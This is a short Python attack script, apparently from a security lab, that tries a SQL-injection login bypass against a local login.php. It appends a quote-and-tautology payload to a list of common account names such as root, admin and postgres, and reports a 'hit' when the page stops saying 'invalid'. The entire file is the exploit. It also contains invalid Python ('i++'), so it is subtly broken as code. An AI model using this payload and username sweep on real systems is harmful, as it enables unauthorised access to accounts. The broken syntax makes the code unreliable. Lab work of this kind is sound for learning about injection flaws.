#!/usr/bin/env python3

import urllib.parse as urlp
import urllib.request as urlr

def send_request(params, url):
    query = urlp.urlencode(params)
    url = url + "?" + query

    with urlr.urlopen(url) as response:
        return response.read(400)


def inject_bypass(user):
    return user + "\" or 1 == 1 --"


usernames = {
    "root",
    "test",
    "oracle",
    "admin",
    "info",
    "user",
    "postgres",
    "mysql",
    "backup",
    "guest",
    "web",
    "tomcat",
    "michael",
    "r00t",
    "upload",
    "alex",
    "sales",
    "linux",
    "bin",
    "ftp",
    "support",
    "temp",
    "nagios",
    "user1",
    "www",
    "test1",
    "nobody"
}

url = "http://localhost/lab09/login.php"

i=1
for username in usernames:
    print(i)
    i++
    # print(username + "...")
    username = inject_bypass(username)
    # print(username)

    params = {
        "u": username,
        "p": ""
    }

    print()
    response = send_request(params, url)

    print(response)

    if(not("invalid" in response.decode('utf-8'))):
        print("\n")
        print("\thit!")
        print("\n")
